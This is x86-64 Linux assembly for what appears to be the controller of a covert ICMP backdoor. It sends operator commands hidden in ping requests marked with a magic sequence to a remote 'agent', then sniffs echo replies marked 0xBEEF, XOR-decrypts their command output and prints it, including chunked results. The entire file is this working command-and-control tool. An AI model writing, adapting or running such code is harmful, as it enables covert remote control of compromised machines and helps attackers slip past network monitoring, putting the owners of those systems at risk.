section .bss
    fd_no resb 4                ; Socket file descriptor
    sniffed_data resb 1200      ; Buffer for received ICMP data
    incoming_addr resb 16       ; Buffer for sender's IP/Port (sockaddr_in)
    addr_len      resd 1        ; Size of sockaddr_in (16 bytes)
    addr_ip resb 16             ; Buffer for formatted string IP address
    ip_buf resb 16              ; Buffer for raw IP input from user

section .data
    msg_ip db "Target IP: "
    len_msg_ip equ $ - msg_ip
    msg_cmd db "Command: "
    len_msg_cmd equ $ - msg_cmd
    newline db 10               ; ASCII newline (\n)
    forip db 4                  ; Legacy unused variable
    space_char db 32            ; ASCII space character
    icmp_packet:
        type db 8               ; ICMP Type 8 (Echo Request)
        code db 0               ; ICMP Code 0
        checksum dw 0           ; Checksum placeholder
        identifier dw 0x1234    ; Packet Identifier
        sequence db 0xDE, 0xAD  ; Sequence number filter (0xDEAD)
        payload times 100 db 0  ; Command payload buffer
    payload_len equ $ - payload ; Length of the command payload
    target_addr:
        dw 2                    ; AF_INET (IPv4)
        dw 0                    ; Port (Unused for ICMP)
        dd 0                    ; Destination IP (Populated via user input)
        dq 0                    ; Padding

section .text
global _start

; --- RAW SOCKET SETUP ---
_start:
    mov rax, 41             ; sys_socket
    mov rdi, 2              ; AF_INET (IPv4)
    mov rsi, 3              ; SOCK_RAW
    mov rdx, 1              ; IPPROTO_ICMP
    syscall                 ; Returns sockfd in rax
    mov [fd_no], eax        ; Save sockfd
;-----------------------------------------------------------------------------------------

    ; --- 1. PROMPT USER FOR IP ---
    mov rax, 1              ; sys_write
    mov rdi, 1              ; stdout
    mov rsi, msg_ip
    mov rdx, len_msg_ip
    syscall

    ; --- 2. READ USER INPUT IP ---
    mov rax, 0              ; sys_read
    mov rdi, 0              ; stdin
    mov rsi, ip_buf
    mov rdx, 16
    syscall

    ; --- 3. STRING TO IP CONVERSION ALGORITHM ---
    lea rsi, [ip_buf]           ; Source: User input string
    lea rdi, [target_addr + 4]  ; Destination: IP field in target_addr struct
    xor ebx, ebx                ; Temporary byte accumulator (0-255)
    xor rax, rax                ; Clear rax

_parse_ip_loop:
    lodsb                       ; Load byte from rsi to al, increment rsi
    cmp al, 10                  ; Check for Newline (Enter)
    je .store_byte              ; Store final segment and finish
    cmp al, 46                  ; Check for Dot (.)
    je .store_byte              ; Store current segment and move to next
    
    ; Logic: ebx = (ebx * 10) + (al - '0')
    sub al, 48                  ; ASCII '0'-'9' to integer 0-9
    imul ebx, 10                ; Shift digits to the left
    add ebx, eax                ; Add new digit
    jmp _parse_ip_loop

.store_byte:
    mov [rdi], bl               ; Store the parsed byte (e.g., 192) to target_addr
    inc rdi                     ; Move target pointer forward 1 byte
    xor ebx, ebx                ; Reset accumulator for next segment
    cmp al, 10                  ; Was the trigger an Enter key?
    je _get_command             ; If yes, conversion done. Move to command prompt.
    jmp _parse_ip_loop          ; If no (was a dot), continue parsing next segment

_get_command:
    ; --- PROMPT FOR COMMAND ---
    mov rax, 0              ; sys_read
    mov rdi, 0              ; stdin
    mov rsi, payload        ; Buffer for command
    mov rdx, 100            
    syscall
    
    ; --- STRIP NEWLINE CHARACTER ---
    dec rax                         ; rax = bytes read, move to last index
    mov byte [payload + rax], 0     ; Null terminate to clean the command string
    ; --------------------------------

    call _checksum_cal      ; Calculate ICMP checksum
    call _sendto            ; Dispatch command packet to target agent
_sniff:
    ; --- SETUP RECVFROM PARAMETERS ---
    mov dword [addr_len], 16   
    mov r8, incoming_addr       
    mov r9, addr_len            
    xor r10, r10                

    ; --- CLEANUP RECEIVE BUFFER ---
    lea rdi, [sniffed_data] 
    xor al, al              
    mov rcx, 1200           
    rep stosb               ; Clear buffer to avoid mixing old data
    ; ---------------------------

    ; --- LISTEN FOR RESPONSE (SNIFF) ---
    mov rax, 45             ; sys_recvfrom 
    mov edi, [fd_no]        
    mov rsi, sniffed_data   
    mov rdx, 1200           
    syscall

    ; --- ICMP TYPE FILTER ---
    cmp byte [sniffed_data + 20], 0     ; Check if Type is 0 (Echo Reply)
    jne _sniff                          ; Ignore if not a reply

    ; --- MAGIC SEQUENCE FILTER ---
    mov cx, word [sniffed_data + 26]    ; Sequence Number (Offset 26)
    cmp cx, 0xEFBE                      ; Match magic 0xBEEF (Little Endian)
    jne _sniff                          

    ; Error handling for recvfrom
    cmp rax, 0               
    jl _error               
    je _exit                

    ; Size check (IP 20 + ICMP 8)
    cmp rax, 28              
    jb _sniff               

;-----------------------------------------------------------------------------------------------

    ; --- EXTRACT PAYLOAD FROM ICMP PACKET ---
    mov r14, rax                     ; Total read bytes
    sub r14, 28                      ; Payload = Total - Headers (28)
    lea rsi, [sniffed_data + 28]    ; rsi points to start of data
    mov rdx, r14                     
    push rdx                        ; Save length for write syscall
    push rsi                        ; Save address for decryption

    ; --- SENDER IP TO STRING CONVERSION (LOGGING) ---
    xor rdx, rdx                     
    xor rbx, rbx                     
    mov rcx, 7                       ; IP raw byte offset
    mov rdi, 15                      ; String buffer offset
_loopforip:
    mov bl, 10                       
    movzx ax, [incoming_addr + rcx]  
_divloop:
    div bl                          
    add ah, 48                       ; Integer to ASCII
    mov [addr_ip + rdi], ah            
    dec rdi                         
    xor ah, ah                       
    cmp al, 0                        
    jg _divloop                     
    cmp rcx, 4                       
    je _contiune                    
    mov byte [addr_ip + rdi], 46     ; Dot (.)
_contiune:
    dec rdi                         
    dec rcx                         
    cmp rcx, 3                       
    jg _loopforip

    ; --- PRINT LOGS TO TERMINAL ---
    mov rax, 1              ; Print IP address
    mov rdi, 1              
    mov rdx, 16              
    mov rsi, addr_ip         
    syscall

    mov rax, 1              ; Print separator space
    mov rdi, 1              
    mov rdx, 1               
    mov rsi, space_char      
    syscall

    pop rsi                 ; Restore payload address
    pop rdx                 ; Restore payload length

    ; --- XOR DECRYPTION PHASE ---
    mov rcx, rdx            ; rcx = payload size (r14)
    call _xor_cipher        ; Decrypt in-place (rsi is preserved)

    ; --- PRINT DECRYPTED OUTPUT ---
    mov rax, 1              ; sys_write
    mov rdi, 1              
    syscall                 

    ; --- CHUNKING LOGIC ---
    cmp r14, 1024           ; Check if payload was full (1024 bytes)
    je _sniff_chunk         ; If full, enter Vitesse 2: Chunking Receiver
    jmp _end_stream         ; If smaller, stream is complete

; ====================================================================
; GEAR 2: PAYLOAD-ONLY LOOP (Chunking Receiver)
; ====================================================================
_sniff_chunk:
    ; --- BUFFER CLEANUP ---
    lea rdi, [sniffed_data]    
    xor al, al                 
    mov rcx, 1200              
    rep stosb                  

    ; --- RECEIVE NEXT CHUNK ---
    mov rax, 45                ; sys_recvfrom 
    mov edi, [fd_no]           
    mov rsi, sniffed_data      
    mov rdx, 1200              
    syscall

    ; --- ERROR & FILTERS ---
    cmp rax, 0
    jl _error                  
    je _exit                   
    cmp rax, 28                
    jb _sniff_chunk            

    cmp byte [sniffed_data + 20], 0     ; Echo Reply filter
    jne _sniff_chunk                    

    mov cx, word [sniffed_data + 26]    ; Magic Sequence filter
    cmp cx, 0xEFBE                      
    jne _sniff_chunk                    

    ; --- EXTRACT & DECRYPT CHUNK ---
    mov r14, rax               
    sub r14, 28                
    lea rsi, [sniffed_data + 28] 
    
    mov rcx, r14                
    call _xor_cipher            

    ; --- PRINT CHUNK ---
    mov rax, 1                 
    mov rdi, 1                 
    mov rdx, r14               
    syscall

    ; --- LOOP CONTROL ---
    cmp r14, 1024              ; Is more data expected?
    je _sniff_chunk            ; YES: Continue receiving chunks
    
    jmp _end_stream            ; NO: Close stream and return to prompt

_end_stream:
    ; --- UI FORMATTING ---
    mov rax, 1              ; Print final newline
    mov rdi, 1              
    mov rsi, newline         
    mov rdx, 1               
    syscall

    jmp _get_command        ; Reset to wait for next user command


_checksum_cal:
    mov word [checksum], 0          ; Reset field before calculation
    xor rcx, rcx                    
    xor r13, r13                    
    xor rax, rax                    ; Accumulator
    xor r12d, r12d                  
    mov rcx, 8                      ; Base ICMP Header size
    add rcx, payload_len            ; Total size for checksum
    mov r13, 0                      
    xor rbx, rbx                    
.checksum_loop:
    movzx r12d, word [icmp_packet + r13] 
    add eax, r12d                   
    add r13, 2                      
    sub rcx, 2                      
    cmp rcx, 2                      
    jge .checksum_loop              
    cmp rcx, 1                      
    je .final                       
    jmp .wrap                       
.final:
    movzx r12d, byte [icmp_packet + r13] 
    add eax, r12d                  

.wrap:
    mov ebx, eax                    
    shr ebx, 16                     ; Extract carry bits
    and eax, 0xFFFF                 ; Mask 16 bits
    add ax, bx                      ; Add carry
    adc ax, 0                       ; Add final carry
    not ax                          ; One's complement
    mov [checksum], ax              
    ret

_sendto:
    mov r13, 8               ; Header length
    add r13, payload_len     ; Total length
    mov rax, 44              ; sys_sendto
    mov rdi, [fd_no]         ; Raw socket
    mov rsi, icmp_packet     
    mov rdx, r13             
    mov r10, 0               
    mov r8, target_addr      ; Target struct (IPv4 + User defined IP)
    mov r9, 16               
    syscall
    ret

_xor_cipher:
    test rcx, rcx               ; Check for zero length
    jz .done                    
    push rsi                    ; Preserve pointer
.loop:
    xor byte [rsi], 0x42        ; Key: 0x42 (In-place XOR)
    inc rsi                     
    loop .loop                  
    pop rsi                     ; Restore pointer
.done:
    ret

_error:
    mov rax, 60              ; sys_exit
    mov rdi, 1               ; Status: Error
    syscall

_exit:
    mov rax, 60              ; sys_exit
    mov rdi, 0               ; Status: Success
    syscall
